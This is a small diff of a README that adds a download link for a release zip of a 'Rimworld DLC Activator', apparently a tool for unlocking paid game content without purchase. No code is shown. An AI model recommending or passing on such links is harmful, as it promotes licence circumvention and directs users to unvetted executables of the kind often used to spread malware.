@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.5+ Release]() = `*Tool files & folder*`
+- [💾 v.1.5+ Release](https://github.com/Rimworld-DLC-Activator-V2/.github/releases/download/ver.115/Rimworld-DLC-Activator.zip) = `*Tool files & folder*`
 
 ---
 
